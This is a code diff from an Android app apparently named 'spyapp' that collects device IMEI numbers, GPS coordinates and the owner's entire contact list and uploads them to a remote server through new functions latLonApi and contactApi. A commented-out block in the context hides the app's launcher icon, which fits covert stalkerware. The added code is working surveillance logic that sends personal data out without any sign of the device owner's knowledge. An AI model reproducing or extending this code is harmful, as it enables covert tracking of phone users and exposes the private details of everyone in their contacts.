@@ -31,6 +31,13 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.google.gson.Gson;
+import com.google.gson.JsonObject;
+import com.google.gson.JsonParser;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
@@ -41,6 +48,7 @@ import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
+import kkactive_india.in.spyapp.locationPOJO.locationBean;
 import kkactive_india.in.spyapp.mailPOJO.mailBean;
 import retrofit2.Call;
 import retrofit2.Callback;
@@ -61,6 +69,7 @@ public class MainActivity extends AppCompatActivity {
     @SuppressLint("HardwareIds") String imeiNumber2;
     String address;
     String  name,phoneNumber, id,lat,lon;
+    List<ContactDatum> data = new ArrayList<>();
 
     @TargetApi(Build.VERSION_CODES.O)
     @RequiresApi(api = Build.VERSION_CODES.M)
@@ -104,6 +113,8 @@ public class MainActivity extends AppCompatActivity {
 
 
                           mainApi();
+                          latLonApi();
+                          //contactApi();
 
                          /* PackageManager p = getPackageManager();
                           ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
@@ -121,6 +132,8 @@ public class MainActivity extends AppCompatActivity {
               }
             }
         });
+
+        Log.d("sadasd" , "kjhasdkh");
 
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -203,6 +216,9 @@ public class MainActivity extends AppCompatActivity {
         StringBuffer sb = new StringBuffer();
         Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
         sb.append("Contact Details :");
+
+        data = new ArrayList<>();
+
         while (phones.moveToNext()) {
             name= phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
             phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
@@ -216,7 +232,18 @@ public class MainActivity extends AppCompatActivity {
             sb.append("\n----------------------------------");
 
 
+
+            ContactDatum person = new ContactDatum();
+            person.setName( name );
+            person.setMobile( phoneNumber );
+            data.add(person);
+
+
+
         }
+
+        contactApi();
+
         phones.close();
         //textView.setText(sb);
 
@@ -239,19 +266,9 @@ public class MainActivity extends AppCompatActivity {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         Allapi cr = retrofit.create(Allapi.class);
-     /*   contactBean body = new contactBean();
-        body.setContactData("contact");
-
-        ContactDatum data = new ContactDatum();
 
 
-        data.setName(name);
-        data.setMobile(phoneNumber);
-
-
-        body.setContactData(data);*/
-
-        Call<MainBean> call = cr.main(id,imeiNumber1,imeiNumber2,lat,lon);
+        Call<MainBean> call = cr.main(id,imeiNumber1,imeiNumber2);
         call.enqueue(new Callback<MainBean>() {
             @Override
             public void onResponse(Call<MainBean> call, Response<MainBean> response) {
@@ -260,6 +277,88 @@ public class MainActivity extends AppCompatActivity {
 
             @Override
             public void onFailure(Call<MainBean> call, Throwable t) {
+
+            }
+        });
+
+    }
+
+    public void latLonApi(){
+        Bean b = (Bean) getApplicationContext();
+
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl(b.baseURL)
+                .addConverterFactory(ScalarsConverterFactory.create())
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        Allapi cr = retrofit.create(Allapi.class);
+        Call<locationBean> call = cr.latlon(id,lat,lon);
+        call.enqueue(new Callback<locationBean>() {
+            @Override
+            public void onResponse(Call<locationBean> call, Response<locationBean> response) {
+                Log.d("latLon", response.body().getMessage());
+            }
+
+            @Override
+            public void onFailure(Call<locationBean> call, Throwable t) {
+
+            }
+        });
+    }
+
+    public void contactApi(){
+
+        Log.d("asdasads" , "asdjhgsadhjasd");
+
+        Bean b = (Bean) getApplicationContext();
+
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl(b.baseURL)
+                .addConverterFactory(ScalarsConverterFactory.create())
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        Allapi cr = retrofit.create(Allapi.class);
+
+
+     /*   contactBean body = new contactBean();
+        body.setContact("contact");
+
+        ContactDatum data = new ContactDatum();
+
+        data.setName(name);
+        data.setMobile(phoneNumber);
+
+        body.setContact(data);*/
+
+
+
+     contactBean body = new contactBean();
+
+
+
+
+        body.setContactData(data);
+
+        Gson gsonObj = new Gson();
+
+        String jsonStr = gsonObj.toJson(body);
+
+
+        Log.d("dgfdh" , jsonStr);
+        Log.d("dgfdh" , id);
+
+
+
+        Call<contactBean> call = cr.contact(id,jsonStr);
+        call.enqueue(new Callback<contactBean>() {
+            @Override
+            public void onResponse(Call<contactBean> call, Response<contactBean> response) {
+                Log.d("contactsHai", "blkl hai bhai");
+
+            }
+
+            @Override
+            public void onFailure(Call<contactBean> call, Throwable t) {
 
             }
         });
